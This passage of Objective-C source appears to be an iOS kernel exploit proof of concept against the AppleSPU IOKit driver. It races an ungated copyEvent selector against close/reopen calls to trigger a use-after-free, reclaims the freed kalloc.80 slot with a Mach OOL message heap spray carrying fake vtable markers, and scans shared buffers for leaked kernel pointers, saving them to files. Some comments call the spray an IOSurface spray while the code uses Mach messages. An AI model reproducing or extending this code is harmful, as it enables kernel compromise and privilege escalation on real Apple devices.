        memcpy(&val, base + off, sizeof(val));

        // Check for kernel text/data addresses (arm64 kernelcache)
        uint32_t hi32 = (uint32_t)(val >> 32);
        BOOL isKernPtr = (hi32 == 0xFFFFFE00)
                      || ((val >> 36) == 0xFFFFFE0)
                      || (hi32 == 0xFFFFFF80);

        if (isKernPtr && val != 0) {
            kernPtrCount++;
            if (off < eventRegionBytes) {
                kernPtrInEvent++;
            } else {
                kernPtrOutside++;
            }
            if (kernPtrCount <= 10) {
                [self appendLog:[NSString stringWithFormat:
                    @"  Kernel address pattern at offset +0x%zx: 0x%016llx (%s event data)",
                    off, val, (off < eventRegionBytes) ? "inside" : "outside"]];
            }
        }
    }

    if (kernPtrCount > 10) {
        [self appendLog:[NSString stringWithFormat:@"  ... and %u more kernel address patterns", kernPtrCount - 10]];
    }

    // Compute entropy of region beyond eventSize
    size_t trailingStart = eventRegionBytes;
    size_t trailingLen = (trailingStart < totalSize) ? (totalSize - trailingStart) : 0;
    double trailingEntropy = 0.0;
    if (trailingLen > 0) {
        trailingEntropy = [self shannonEntropyForBytes:base + trailingStart length:trailingLen];
    }

    [self appendLog:[NSString stringWithFormat:
        @"Baseline scan: kernelAddrPatterns=%u (inEvent=%u, outside=%u) trailingEntropy=%.4f trailingBytes=%zu",
        kernPtrCount, kernPtrInEvent, kernPtrOutside, trailingEntropy, trailingLen]];

    if (kernPtrCount > 0) {
        [self appendLog:@"  SIGNAL: Kernel address patterns detected in mapped region at baseline."];
    } else {
        [self appendLog:@"  No kernel address patterns found at baseline."];
    }

    [self appendLog:@"====== Sub-phase A Complete ======"];
}

#pragma mark - Sub-phase B: Lifecycle Desynchronization Stress

- (void)runLifecycleDesyncStress:(io_connect_t *)connections
                           count:(int)connCount
                      mappedAddr:(mach_vm_address_t)mappedAddr
                      mappedSize:(mach_vm_size_t)mappedSize
                   auxMappings:(mach_vm_address_t *)auxMappedAddrs
                 auxMappedSizes:(mach_vm_size_t *)auxMappedSizes
                    raceService:(io_service_t)raceService {
    [self appendLog:@"\n====== Sub-phase B: Lifecycle Desynchronization Stress ======"];
    [self appendLog:[NSString stringWithFormat:@"  Using %d connections (separate per-userclient gates)", connCount]];

    // ---- Strategy (revised based on IDA + fault backtrace analysis) ----
    //
    // Key findings from kernel analysis (iPad xnu-10063):
    //   1. externalMethod dispatch (sub_FFFFFFF005AD171C):
    //        if (selector == 2) → DIRECT call (no command gate!)
    //        else               → IOCommandGate::runAction (gated)
    //      Selector 2 (copyEvent) bypasses the per-userclient command gate entirely.
    //
    //   2. All user clients share the PROVIDER's work loop (IOService::getWorkLoop
    //      at slot 111 is base impl — returns provider's WL). So sel 0/1 from ANY
    //      connection are serialized by the work loop. But sel 2 from ANY connection
    //      runs concurrently with gated actions.
    //
    //   3. Each user client has its own IOLock at +0x110. copyEvent (sel 2) takes
    //      this per-connection lock to check the opened flag and call provider->copyEvent.
    //      closeForClient (from sel 1) runs OUTSIDE this lock.
    //
    //   4. THE CROSS-CONNECTION RACE:
    //      - conn[0] sel 1 (gated): close handler → IOLock(conn[0]) → clear opened →
    //        IOUnlock(conn[0]) → closeForClient(provider, ...) ← modifies provider internals
    //      - conn[1] sel 2 (ungated): IOLock(conn[1]) → opened=true → provider->copyEvent()
    //        ← reads provider internals CONCURRENTLY
    //      Different IOLocks, different sync domains, same provider. The provider's
    //      closeForClient and copyEvent share internal data structures (client list at
    //      provider+504/+512) without mutual exclusion.
    //
    //   5. Fault evidence (both iPhone MTE + iPad zone free-fill):
    //      The fault occurs in AppleSPU's openForClient (sub_FFFFFFF005B6776C) calling
    //      safeMetaCast on a freed internal object. Backtrace shows the faulting thread
    //      was executing sel 0 (open) through the command gate, operating on provider
    //      state that was freed by a concurrent/preceding closeForClient.
    //
    // Test strategy (Mach OOL spray edition):
    //   - conn[0]: lifecycle thread — close → (reader races on dangling ptr) → reopen
    //   - conn[1..readerEnd]: reader threads — copyEvent tight loop (selector 2, un-gated)
    //   - conn[readerEnd..N]: churn threads — close/reopen for provider-level pressure
    //   - Spray thread: cycles Mach OOL message send/receive. Each send copies
    //     72 bytes of controlled data to kalloc.80. Messages are held in a local
    //     port queue (not received) until the UAF window closes. When conn[0]'s
    //     ClientObject is freed, the spray thread's next send reclaims the slot.
    //     No entitlement needed — mach_msg is available to all processes.
    //   - NOTE: On affected builds, this test may trigger unexpected behavior.

    static const int kLifecycleCycles = 2000;
    static const int kMagazineDrainCycles = 4;
    static const NSTimeInterval kStressDuration = 25.0;
    enum { kOolMsgCount = 300, kOolDataSize = 72 };

    __block atomic_int stopFlag = 0;
    __block atomic_int anomalyCount = 0;
    __block atomic_int sizeAnomalyCount = 0;
    __block atomic_int migErrorCount = 0;
    __block atomic_int readerIterations = 0;
    __block atomic_int lifecycleIterations = 0;
    __block atomic_int churnIterations = 0;
    __block atomic_int lifecycleCloseErrors = 0;
    __block atomic_int lifecycleOpenErrors = 0;
    __block atomic_int churnCloseErrors = 0;
    __block atomic_int churnOpenErrors = 0;
    __block atomic_int crossClientHits = 0;    // Auxiliary buffer received unexpected event data
    __block atomic_int terminationRaceIters = 0;
    __block atomic_int terminationBothSucceeded = 0; // Both sel1 + IOServiceClose returned success
    __block atomic_int terminationMigErrors = 0;     // MIG-style errors observed in sel1 path
    __block atomic_int terminationSel1Errors = 0;    // sel1 returned non-success
    __block atomic_int terminationSvcCloseErrors = 0;// IOServiceClose returned non-success

    // Snapshot auxiliary buffers before stress to detect cross-client data misdirection.
    // If the ClientObject reference at conn[0] becomes invalidated during copyEvent,
    // the provider may write event data to a different client's mapped buffer instead.
    const int kMaxAux = 16;
    // Heap-allocate so the block can capture the pointer (C arrays can't be block-captured).
    uint8_t (*auxPreSnaps)[kCrossClientSampleBytes] =
        (uint8_t (*)[kCrossClientSampleBytes])calloc(kMaxAux, kCrossClientSampleBytes);
    if (!auxPreSnaps) {
        [self appendLog:@"  WARNING: auxPreSnaps allocation failed; cross-client monitor disabled for this run."];
    }
    size_t *auxSampleLens = (size_t *)calloc(kMaxAux, sizeof(size_t));
    if (!auxSampleLens) {
        [self appendLog:@"  WARNING: auxSampleLens allocation failed; cross-client monitor disabled for this run."];
    }
    __block atomic_int firstCrossClientConn = ATOMIC_VAR_INIT(-1);
    __block atomic_int firstCrossClientEventSize = ATOMIC_VAR_INIT(0);
    __block atomic_int firstCrossClientSampleSet = ATOMIC_VAR_INIT(0);
    __block atomic_int firstCrossClientPtrOffset = ATOMIC_VAR_INIT(-1);
    __block volatile uint64_t firstCrossClientPtr = 0;
    uint8_t *firstCrossClientSample = (uint8_t *)malloc(kCrossClientSampleBytes);
    if (firstCrossClientSample) {
        memset(firstCrossClientSample, 0, kCrossClientSampleBytes);
    }
    for (int i = 1; i < connCount && i < kMaxAux; i++) {
        if (!auxPreSnaps || !auxSampleLens) break;
        if (auxMappedAddrs[i] != 0) {
            auxSampleLens[i] = MIN((size_t)auxMappedSizes[i], kCrossClientSampleBytes);
            if (auxSampleLens[i] > 0) {
                memcpy(auxPreSnaps[i], (const void *)(uintptr_t)auxMappedAddrs[i], auxSampleLens[i]);
            }
        }
    }

    // ---- Phase 1: Allocation Conditioning (hypothesis-based) ----
    // Cycle close/reopen on ALL connections to exercise the magazine swap path
    // for the ClientObject type-isolated zone. Each cycle releases + allocates one
    // ClientObject (0x48 bytes).
    uint32_t drainCloseErrs = 0, drainOpenErrs = 0;
    [self appendLog:[NSString stringWithFormat:@"  Allocation conditioning: %d close/reopen cycles across %d connections (ClientObject zone)...",
                     kMagazineDrainCycles, connCount]];
    // Simple close/reopen cycles to pre-condition the kalloc.80 freelist.
    // The REAL spray (with controlled data) happens inside the churn threads
    // during the UAF window — that's where it matters.
    for (int i = 0; i < kMagazineDrainCycles; i++) {
        for (int c = 0; c < connCount; c++) {
            uint64_t closeScalar = 0;
            kern_return_t ckr = sIOConnectCallMethod(connections[c], kSelectorClose,
                                 &closeScalar, 1, NULL, 0, NULL, NULL, NULL, NULL);
            if (ckr != KERN_SUCCESS) drainCloseErrs++;
        }
        for (int c = connCount - 1; c >= 0; c--) {
            uint64_t openScalar = 0;
            const char *xml = kOpenPropertiesXML;
            kern_return_t okr = sIOConnectCallMethod(connections[c], kSelectorOpen,
                                 &openScalar, 1, xml, strlen(xml) + 1,
                                 NULL, NULL, NULL, NULL);
            if (okr != KERN_SUCCESS) drainOpenErrs++;
        }
    }
    [self appendLog:[NSString stringWithFormat:@"  Allocation conditioning complete (%d cycles x %d conns = %d ClientObject alloc/release pairs). closeErrors=%u openErrors=%u",
                     kMagazineDrainCycles, connCount, kMagazineDrainCycles * connCount, drainCloseErrs, drainOpenErrs]];

    // ---- Mach OOL spray setup (kalloc.80 reclaim) ----
    // PHYSICAL_COPY forces the kernel to kalloc+copy the OOL data (72B, with our
    // fake vtable markers at offset 0 → kalloc.80). The message buffer itself has
    // no padding (~44B → kalloc.64) so it doesn't compete for kalloc.80 slots.
    // When ClientObject (~72B, kalloc.80) is freed, the next send's OOL data copy
    // allocation reclaims that exact slot (LIFO), filling it with our markers.
    typedef struct {
        mach_msg_header_t header;        // 24 bytes
        mach_msg_body_t body;            //  4 bytes
        mach_msg_ool_descriptor_t ool;   // 16 bytes → total ~44B → kalloc.64
    } OOLMsg;

    // Mach port default queue limit is 5. We pre-fill exactly 5 messages to stay
    // within the limit WITHOUT needing mach_port_set_attributes (which may be
    // restricted on iOS). The spray thread then cycles these 5 messages rapidly.
    enum { kSprayQueueDepth = 5 };

    mach_port_t sprayRecv = MACH_PORT_NULL;
    mach_port_t spraySend = MACH_PORT_NULL;
    __block int sprayReady = 0;
    if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &sprayRecv) == KERN_SUCCESS) {
        mach_msg_type_name_t poly = 0;
        if (mach_port_extract_right(mach_task_self_, sprayRecv,
            MACH_MSG_TYPE_MAKE_SEND, &spraySend, &poly) == KERN_SUCCESS) {
            sprayReady = 1;
        } else {
            mach_port_destroy(mach_task_self_, sprayRecv);
            sprayRecv = MACH_PORT_NULL;
        }
    }
    [self appendLog:[NSString stringWithFormat:@"  Spray port: %@", sprayReady ? @"OK" : @"FAILED"]];

    // Need heap payload so block capture is valid (stack buffer would go out of scope)
    uint8_t *sprayPayload = NULL;
    if (sprayReady) {
        sprayPayload = (uint8_t *)malloc(kOolDataSize);
        if (sprayPayload) {
            // Fill entire 72 bytes with 0xCC — if spray reclaims ClientObject's
            // kalloc.80 slot, copyEvent will read 0xCC from the overwritten fields.
            // If event[0x60] changes from 0xd3→0xCC, spray controls that field.
            memset(sprayPayload, 0xCC, kOolDataSize);

            // Pre-fill: kSprayQueueDepth messages (fits default Mach port queue limit).
            // Each send copies the 72-byte OOLMsg to kalloc.80 in the port queue.
            int sent = 0;
            for (int i = 0; i < kSprayQueueDepth; i++) {
                OOLMsg msg;
                memset(&msg, 0, sizeof(msg));
                msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
                msg.header.msgh_size = sizeof(OOLMsg);
                msg.header.msgh_remote_port = spraySend;
                msg.header.msgh_id = (mach_msg_id_t)i;
                msg.body.msgh_descriptor_count = 1;
                msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
                msg.ool.address = sprayPayload;
                msg.ool.size = kOolDataSize;
                msg.ool.deallocate = FALSE;
                msg.ool.copy = MACH_MSG_PHYSICAL_COPY;
                if (mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL) == MACH_MSG_SUCCESS) {
                    sent++;
                }
            }
            [self appendLog:[NSString stringWithFormat:@"  Mach OOL spray: %d/%d msgs pre-filled (OOLMsg=%zuB→kalloc.80, payload=0xCC*%d)", sent, kSprayQueueDepth, sizeof(OOLMsg), kOolDataSize]];
            if (sent == 0) sprayReady = 0;
        } else {
            sprayReady = 0;
        }
    }
    if (!sprayReady) {
        [self appendLog:@"  WARNING: Mach OOL spray setup failed — spray disabled"];
    }

    // Capture mapped buffer state immediately before stress
    uint8_t preStressSnap[64];
    memset(preStressSnap, 0, sizeof(preStressSnap));
    size_t preStressLen = MIN((size_t)64, (size_t)mappedSize);
    memcpy(preStressSnap, (const void *)(uintptr_t)mappedAddr, preStressLen);

    dispatch_group_t group = dispatch_group_create();
    dispatch_semaphore_t sprayStarted = NULL;

    // ---- Mach OOL spray thread — kalloc.80 alloc/free cycling ----
    // CRITICAL: send BEFORE recv in each cycle. kalloc is LIFO: recv-then-send
    // self-circulates (recv frees slot → freelist head → send gets same slot back).
    // Send-first means the send gets whatever slot the rest of the kernel last freed
    // (e.g. ClientObject's slot after closeForClient), then recv frees to make room.
    //
    // Start: port queue has 5 pre-filled messages (full). Pre-drain 1 → 4 in queue,
    // 1 slot on freelist. Then loop: send → queue full (5), recv → queue has room (4).
    dispatch_queue_t sprayQueue = NULL;
    if (sprayReady) {
        sprayQueue = dispatch_queue_create("com.testpoc.lifecycle.spray",
            dispatch_queue_attr_make_with_qos_class(DISPATCH_QUEUE_SERIAL, QOS_CLASS_USER_INITIATED, 0));
        sprayStarted = dispatch_semaphore_create(0);
        dispatch_group_enter(group);
        dispatch_async(sprayQueue, ^{
            // Pre-drain one message: make room for send-first loop.
            // The freed kalloc.80 slot goes to freelist (seeds with our data).
            {
                OOLMsg drainMsg;
                drainMsg.header.msgh_local_port = sprayRecv;
                drainMsg.header.msgh_size = sizeof(OOLMsg);
                kern_return_t drkr = mach_msg(&drainMsg.header, MACH_RCV_MSG, 0, sizeof(OOLMsg), sprayRecv, 0, MACH_PORT_NULL);
                if (drkr == MACH_MSG_SUCCESS) {
                    dispatch_semaphore_signal(sprayStarted);
                }
            }

            // Send-first cycling: each send allocates a NEW kalloc.80 slot from the
            // freelist head (LIFO). If the kernel just freed ClientObject, its slot
            // is at the freelist head and our send fills it with our fake vtable.
            while (atomic_load(&stopFlag) == 0) {
                // SEND first — alloc from freelist head (may get ClientObject's slot)
                OOLMsg sndMsg;
                memset(&sndMsg, 0, sizeof(sndMsg));
                sndMsg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
                sndMsg.header.msgh_size = sizeof(OOLMsg);
                sndMsg.header.msgh_remote_port = spraySend;
                sndMsg.body.msgh_descriptor_count = 1;
                sndMsg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
                sndMsg.ool.address = sprayPayload;
                sndMsg.ool.size = kOolDataSize;
                sndMsg.ool.deallocate = FALSE;
                sndMsg.ool.copy = MACH_MSG_PHYSICAL_COPY;
                mach_msg(&sndMsg.header, MACH_SEND_MSG, sizeof(OOLMsg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);

                // RECV second — frees one slot to make room for next send
                OOLMsg rcvMsg;
                rcvMsg.header.msgh_local_port = sprayRecv;
                rcvMsg.header.msgh_size = sizeof(OOLMsg);
                mach_msg(&rcvMsg.header, MACH_RCV_MSG, 0, sizeof(OOLMsg), sprayRecv, 0, MACH_PORT_NULL);
            }

            // No drain needed — port destroy (cleanup section) frees remaining messages
            dispatch_group_leave(group);
        });
    }

    // ---- Block until spray thread confirms pre-drain complete ----
    if (sprayStarted) {
        dispatch_semaphore_wait(sprayStarted, dispatch_time(DISPATCH_TIME_NOW, 2 * NSEC_PER_SEC));
        [self appendLog:@"  Spray thread confirmed cycling (send-first)"];
    }

    // ---- Reader threads — copyEvent on conn[1..readerEnd] (bypasses command gate) ----
    // CROSS-CONNECTION RACE: CopyEvent (sel 2) bypasses the command gate entirely
    // (IDA: sub_FFFFFFF005AD171C — if selector==2, direct call, no runAction).
    // The reader uses conn[1+] which stays permanently OPEN, so copyEvent always
    // passes the opened check and reaches provider->copyEvent(vtable+0x668).
    // Meanwhile conn[0]'s close (sel 1, gated) calls closeForClient on the SAME
    // provider OUTSIDE any lock. Different IOLocks (conn[0]+0x110 vs conn[K]+0x110),
    // same provider internals — this is the synchronization gap.
    //
    // We use multiple dedicated reader connections (never closed) to maximize the
    // chance that at least one is mid-provider->copyEvent when closeForClient fires.
    int readerEnd = (connCount > 4) ? (1 + (connCount - 1) / 2) : MIN(connCount, 2);
    int readerCount = readerEnd - 1; // conn[1..readerEnd-1]
    if (readerCount < 1) readerCount = 1;
    [self appendLog:[NSString stringWithFormat:@"  Reader connections: conn[1..%d] (%d readers), Churn: conn[%d..%d]",
                     readerEnd - 1, readerCount, readerEnd, connCount - 1]];

    for (int rIdx = 1; rIdx < readerEnd && rIdx < connCount; rIdx++) {
        io_connect_t readerConn = connections[rIdx];
        // Each reader's own mapped buffer (copyEvent writes to the calling client's buffer)
        mach_vm_address_t readerMapped = (rIdx < kMaxAux) ? auxMappedAddrs[rIdx] : 0;
        mach_vm_size_t readerMappedSz = (rIdx < kMaxAux) ? auxMappedSizes[rIdx] : 0;

        dispatch_queue_t readerQueue = dispatch_queue_create("com.testpoc.lifecycle.reader",
            dispatch_queue_attr_make_with_qos_class(DISPATCH_QUEUE_SERIAL, QOS_CLASS_USER_INITIATED, 0));

        dispatch_group_enter(group);
        dispatch_async(readerQueue, ^{
            uint32_t localReaderIter = 0;
            while (atomic_load(&stopFlag) == 0) {
                uint64_t scalarsIn[2] = { 0, 1 };
                uint8_t structOut[256];
                size_t structOutSize = sizeof(structOut);

                // copyEvent on conn[K] (K!=0): reaches provider->copyEvent under conn[K]'s
                // IOLock while conn[0]'s closeForClient modifies provider state with NO lock
                kern_return_t kr = sIOConnectCallMethod(
                    readerConn, kSelectorCopyEvent,
                    scalarsIn, 2, NULL, 0,
                    NULL, NULL, structOut, &structOutSize
                );

                localReaderIter++;

                // MIG errors indicate connection-level state inconsistency
                if ((kr & 0xFFFF0000) == 0x10000000) {
                    atomic_fetch_add(&migErrorCount, 1);
                }

                // Unexpected return codes (not in known set)
                if (kr != KERN_SUCCESS
                    && kr != (kern_return_t)0xE00002CD   // kIOReturnNotReady
                    && kr != (kern_return_t)0xE00002BC   // kIOReturnBadArgument
                    && kr != (kern_return_t)0xE00002BE   // kIOReturnNotOpen
                    && kr != (kern_return_t)0xE00002C2   // kIOReturnExclusiveAccess
                    && kr != (kern_return_t)0xE00002C5   // kIOReturnNotPermitted
                    && (kr & 0xFFFF0000) != 0x10000000) {
                    atomic_fetch_add(&anomalyCount, 1);
                    if (atomic_load(&anomalyCount) <= 10) {
                        [self appendLog:[NSString stringWithFormat:
                            @"  Reader[%d] anomaly: unexpected kr=0x%x (%s) at iter %u",
                            rIdx, kr, mach_error_string(kr), localReaderIter]];
                    }
                }

                // Size anomaly check on THIS reader's mapped buffer
                // (copyEvent writes event data to the calling client's shared mapping)
                if (readerMapped != 0 && readerMappedSz >= 8) {
                    uint32_t eventSize = 0;
                    memcpy(&eventSize, (const void *)(uintptr_t)readerMapped, sizeof(eventSize));
                    if ((uint64_t)eventSize + 4ull > (uint64_t)readerMappedSz) {
                        atomic_fetch_add(&sizeAnomalyCount, 1);
                        if (atomic_load(&sizeAnomalyCount) <= 5) {
                            [self appendLog:[NSString stringWithFormat:
                                @"  Size anomaly[%d]: payloadLen=%u (needs=%llu incl header) > mappedSize=%llu at iter %u",
                                rIdx, eventSize, (unsigned long long)((uint64_t)eventSize + 4ull),
                                (unsigned long long)readerMappedSz, localReaderIter]];
                        }
                    }
                }

                if ((localReaderIter & 0x3F) == 0) {
                    sched_yield();
                }
            }
            atomic_fetch_add(&readerIterations, (int)localReaderIter);
            dispatch_group_leave(group);
        });
    } // end reader loop over conn[1..readerEnd-1]

    // ---- Lifecycle thread — close/reopen cycles on conn[0] ----
    // conn[0] sel 1 (gated) → close handler → closeForClient(provider) OUTSIDE IOLock.
    // This modifies provider internals (client list at +504/+512) while readers on
    // conn[1..N] are concurrently calling provider->copyEvent under their own IOLocks.
    dispatch_queue_t lifecycleQueue = dispatch_queue_create("com.testpoc.lifecycle.closer",
        dispatch_queue_attr_make_with_qos_class(DISPATCH_QUEUE_SERIAL, QOS_CLASS_USER_INITIATED, 0));

    dispatch_group_enter(group);
    dispatch_async(lifecycleQueue, ^{
        uint32_t localCycles = 0;
        for (int cycle = 0; cycle < kLifecycleCycles && atomic_load(&stopFlag) == 0; cycle++) {
            // Close on conn[0] — releases ClientObject (0x48 bytes) back to its type-isolated zone
            uint64_t closeScalar = 0;
            kern_return_t ckr = sIOConnectCallMethod(connections[0], kSelectorClose,
                                 &closeScalar, 1, NULL, 0, NULL, NULL, NULL, NULL);
            if (ckr != KERN_SUCCESS) {
                atomic_fetch_add(&lifecycleCloseErrors, 1);
            }

            // IOSurface spray thread reclaims freed ClientObject slot.
            // The tight-loop SetValue/RemoveValue cycling in the spray
            // thread ensures the next kalloc.80 allocation after this
            // close grabs the freed slot (LIFO zone freelist).

            // Re-open — allocates a NEW ClientObject from the same zone.
            uint64_t openScalar = 0;
            const char *xml = kOpenPropertiesXML;
            kern_return_t okr = sIOConnectCallMethod(connections[0], kSelectorOpen,
                                 &openScalar, 1,
                                 xml, strlen(xml) + 1,
                                 NULL, NULL, NULL, NULL);
            if (okr != KERN_SUCCESS) {
                atomic_fetch_add(&lifecycleOpenErrors, 1);
            }

            localCycles++;
            usleep(500); // 0.5ms gap — throttle SPU, keep within 40s window
            if (cycle % 400 == 0) {
                [self appendLog:[NSString stringWithFormat:@"  Lifecycle cycle %d/%d", cycle, kLifecycleCycles]];
            }
        }
        atomic_store(&lifecycleIterations, (int)localCycles);
        dispatch_group_leave(group);
    });

    // ---- Allocation churn threads — close/reopen on conn[readerEnd..N] ----
    // These close/reopen auxiliary connections to create allocation pressure on the provider's
    // internal client structures (provider+504/+512). Each close/reopen triggers
    // closeForClient/openForClient on the provider, racing with conn[1..readerEnd]'s
    // copyEvent on the provider's shared internal state.
    for (int churnIdx = readerEnd; churnIdx < connCount; churnIdx++) {
        io_connect_t churnConn = connections[churnIdx];

        dispatch_queue_t churnQueue = dispatch_queue_create("com.testpoc.lifecycle.churn",
            dispatch_queue_attr_make_with_qos_class(DISPATCH_QUEUE_SERIAL, QOS_CLASS_USER_INITIATED, 0));

        dispatch_group_enter(group);
        dispatch_async(churnQueue, ^{
            uint32_t localChurnIter = 0;
            uint32_t localCloseErrs = 0;
            uint32_t localOpenErrs = 0;
            while (atomic_load(&stopFlag) == 0) {
                // Close — releases this auxiliary connection's ClientObject
                uint64_t closeScalar = 0;
                kern_return_t ckr = sIOConnectCallMethod(churnConn, kSelectorClose,
                                                          &closeScalar, 1, NULL, 0,
                                                          NULL, NULL, NULL, NULL);
                if (ckr != KERN_SUCCESS) localCloseErrs++;

                // Spray is handled by the dedicated IOSurface spray thread.
                // Churn just creates provider-level closeForClient/openForClient
                // pressure racing with reader copyEvent.
                uint64_t openScalar = 0;
                const char *xml = kOpenPropertiesXML;
                kern_return_t okr = sIOConnectCallMethod(churnConn, kSelectorOpen,
                                                          &openScalar, 1,
                                                          xml, strlen(xml) + 1,
                                                          NULL, NULL, NULL, NULL);
                if (okr != KERN_SUCCESS) localOpenErrs++;

                localChurnIter++;

                if ((localChurnIter & 0x1F) == 0) {
                    sched_yield();
                }
            }
            atomic_fetch_add(&churnIterations, (int)localChurnIter);
            atomic_fetch_add(&churnCloseErrors, (int)localCloseErrs);
            atomic_fetch_add(&churnOpenErrors, (int)localOpenErrs);
            dispatch_group_leave(group);
        });
    }

    // Termination race runs as a separate dedicated phase after the main stress completes.
    // (Moved out of the concurrent group — see post-stress section below.)

    // ---- Primary buffer kernel pointer scanner — aggressive leak detection during race ----
    // Periodically scan the primary mapped buffer for kernel pointer patterns during the stress.
    // This catches transient leaks that appear in race windows but might not persist.
    __block atomic_int primaryScanCount = ATOMIC_VAR_INIT(0);
    __block atomic_int primaryLeakCount = ATOMIC_VAR_INIT(0);
    dispatch_queue_t scannerQueue = dispatch_queue_create("com.testpoc.lifecycle.scanner",
        dispatch_queue_attr_make_with_qos_class(DISPATCH_QUEUE_SERIAL, QOS_CLASS_USER_INITIATED, 0));

    dispatch_group_enter(group);
    dispatch_async(scannerQueue, ^{
        uint32_t scanIter = 0;
        size_t scanSize = MIN((size_t)mappedSize, (size_t)kMappedProbeMaxBytes);
        const uint8_t *scanBase = (const uint8_t *)(uintptr_t)mappedAddr;

        while (atomic_load(&stopFlag) == 0) {
            scanIter++;

            // Aggressive scan for kernel pointers in primary buffer
            NSArray<NSDictionary *> *leaks = [self scanForKernelPointers:scanBase
                                                                  length:scanSize
                                                              maxResults:50
                                                               connIndex:0];

            // Also scan for zone free-patterns (stale reference indicators)
            // Only do this every 10th iteration to reduce overhead
            int localFreePatterns = 0;
            if ((scanIter & 0x0F) == 0) {
                for (size_t off = 0; off + 8 <= scanSize; off += 8) {
                    uint64_t val = 0;
                    memcpy(&val, scanBase + off, sizeof(val));
                    if ([self isZoneFreePattern:val]) {
                        localFreePatterns++;
                        if (localFreePatterns == 1) {
                            [self appendLog:[NSString stringWithFormat:
                                @"  *** ZONE FREE-PATTERN in primary buffer (scan #%u) at +0x%zx: 0x%016llx ***",
                                scanIter, off, val]];
                        }
                    }
                }
            }

            if (leaks.count > 0) {
                int currentLeaks = atomic_fetch_add(&primaryLeakCount, (int)leaks.count);

                // Log first few leaks detected during race
                if (currentLeaks < 10) {
                    [self appendLog:[NSString stringWithFormat:
                        @"  *** PRIMARY BUFFER FINDING (race scan #%u): %lu kernel pointer patterns detected ***",
                        scanIter, (unsigned long)leaks.count]];

                    NSUInteger detailCount = MIN(3, leaks.count);
                    for (NSUInteger i = 0; i < detailCount; i++) {
                        NSDictionary *leak = leaks[i];
                        [self appendLog:[NSString stringWithFormat:
                            @"      [%lu] offset=0x%@ value=%@ inArray=%@",
                            (unsigned long)i,
                            leak[@"offset"],
                            leak[@"value"],
                            leak[@"inArray"]]];
                    }
                }

                // Store first leak if not already captured
                if (!self.proofKernelPointerLeak) {
                    NSDictionary *firstLeak = leaks[0];
                    uint64_t leakValue = 0;
                    sscanf([firstLeak[@"value"] UTF8String], "0x%llx", &leakValue);
                    self.proofKernelPointerLeak = YES;
                    self.proofKernelPointerValue = leakValue;
                    self.proofKernelPointerOffset = [firstLeak[@"offset"] intValue];
                    self.proofKernelPointerSourceConn = 0;
                    self.proofKernelPointerHex = [self hexPreview:(uint8_t *)&leakValue length:sizeof(leakValue)];
                    // Dump leaked pointer to file for post-reboot recovery
                    NSString *kpPath = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject stringByAppendingPathComponent:@"sword/kptr.txt"];
                    [[NSString stringWithFormat:@"0x%016llx offset=%d\n", leakValue, self.proofKernelPointerOffset] writeToFile:kpPath atomically:YES];
                }
            }

            atomic_fetch_add(&primaryScanCount, 1);

            // Scan every 2ms for high-frequency leak detection during race windows
            usleep(2000);
        }

        [self appendLog:[NSString stringWithFormat:
            @"  Primary buffer scanner: %u scans, %d total leaks detected",
            scanIter, atomic_load(&primaryLeakCount)]];
        dispatch_group_leave(group);
    });

    // ---- Cross-client monitor — watches auxiliary buffers for misdirected events ----
    // If the ClientObject reference at conn[0] becomes invalidated and another client's
    // object occupies the same memory, the provider may write event data to a different
    // client's mapped buffer. We detect this by checking auxiliary buffers for changes.
    __block atomic_int crossClientChecks = 0;
    if (connCount > 1) {
        dispatch_queue_t monitorQueue = dispatch_queue_create("com.testpoc.lifecycle.monitor",
            dispatch_queue_attr_make_with_qos_class(DISPATCH_QUEUE_SERIAL, QOS_CLASS_USER_INITIATED, 0));

        dispatch_group_enter(group);
        dispatch_async(monitorQueue, ^{
            uint32_t localChecks = 0;
            while (atomic_load(&stopFlag) == 0) {
                for (int i = 1; i < connCount && i < kMaxAux; i++) {
                    size_t sampleLen = auxSampleLens ? auxSampleLens[i] : 0;
                    if (auxMappedAddrs[i] == 0 || sampleLen == 0) continue;
                    if (sampleLen > kCrossClientSampleBytes) {
                        sampleLen = kCrossClientSampleBytes;
                    }
                    uint8_t *current = (uint8_t *)malloc(sampleLen);
                    if (!current) {
                        continue;
                    }
                    memcpy(current, (const void *)(uintptr_t)auxMappedAddrs[i], sampleLen);
                    if (!auxPreSnaps) {
                        free(current);
                        continue;
                    }
                    if (memcmp(current, auxPreSnaps[i], sampleLen) != 0) {
                        int hitNum = atomic_fetch_add(&crossClientHits, 1);
                        uint32_t evtSz = 0;
                        memcpy(&evtSz, current, MIN(sizeof(evtSz), sampleLen));

                        // Aggressive kernel pointer scan on changed buffer
                        NSArray<NSDictionary *> *leaks = [self scanForKernelPointers:current
                                                                              length:sampleLen
                                                                          maxResults:20
                                                                           connIndex:i];

                        if (hitNum < 5 || leaks.count > 0) {
                            static dispatch_once_t bdumpOnce;
                            dispatch_once(&bdumpOnce, ^{
                                NSString *binPath = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject stringByAppendingPathComponent:@"sword/misdelivery.bin"];
                                [[NSData dataWithBytes:current length:sampleLen] writeToFile:binPath atomically:YES];
                            });
                            // EMERGENCY STOP: halt all SPU threads to prevent AOP overflow
                            atomic_store(&stopFlag, 1);
                            [self appendLog:@"*** UAF DETECTED — stopping all threads ***"];
                            [self appendLog:[NSString stringWithFormat:
                                @"  CROSS-CLIENT: aux conn[%d] buffer changed (eventSize=%u, kernPtrs=%lu) — possible data misdirection",
                                i, evtSz, (unsigned long)leaks.count]];

                            if (leaks.count > 0) {
                                [self appendLog:@"    *** KERNEL POINTER PATTERNS IN CROSS-CLIENT BUFFER:"];
                                NSUInteger detailCount = MIN(3, leaks.count);
                                for (NSUInteger j = 0; j < detailCount; j++) {
                                    NSDictionary *leak = leaks[j];
                                    [self appendLog:[NSString stringWithFormat:@"      [%lu] offset=0x%@ value=%@",
